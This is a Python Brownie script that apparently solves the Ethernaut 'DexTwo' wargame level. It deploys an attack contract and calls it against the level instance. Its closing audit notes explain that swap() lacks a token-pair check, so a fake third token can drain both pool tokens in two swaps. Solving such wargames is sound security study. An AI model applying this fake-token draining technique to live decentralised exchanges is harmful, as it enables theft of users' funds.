from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, DexTwo, Attack23
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0xdA3ecB48DFeEB21B4b2B177d64d6dfB2B8FE884e"

TOKEN1 = "0xC05734547415687cF19482183D58a2E173f2Ebd6"
TOKEN2 = "0x3021528D0f836c13278CD2eD990893008724B5F9"

GAS_LIMIT = 12000000


def main():
    player = get_account()
    target = interface.IDexTwo(ETHERNAUT_INSTANCE)
    attack = Attack23.deploy(ETHERNAUT_INSTANCE, 0, 200, {"from": player})
    print_balances(target)
    print_balances(target)
    target.approve(ETHERNAUT_INSTANCE, 1000)
    attack.attack({"from": player})


def print_balances(_target):
    token1_balance = _target.balanceOf(TOKEN1, ETHERNAUT_INSTANCE)
    token2_balance = _target.balanceOf(TOKEN2, ETHERNAUT_INSTANCE)
    print(f"\nBalance of token1 = {token1_balance}")
    print(f"Balance of token2 = {token2_balance}\n")


""" 
        Audit notes

    1. we need to drain token1 AND token2 this time!!    

    2. function swap() has been modified, from Dex (one)
        
    2a. the following require statement has been removed:

        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

    3. player balances of each token = 10

    4. DexTwo balances of each token = 100 

    
        Attack philosophy:

    1. deploy an attack contract to act as a 3rd token pool ??

    2. swap calculation in level-23 spreadsheet
    
    3. can do this in 2 swaps, starting with 200 of token3_player

"""
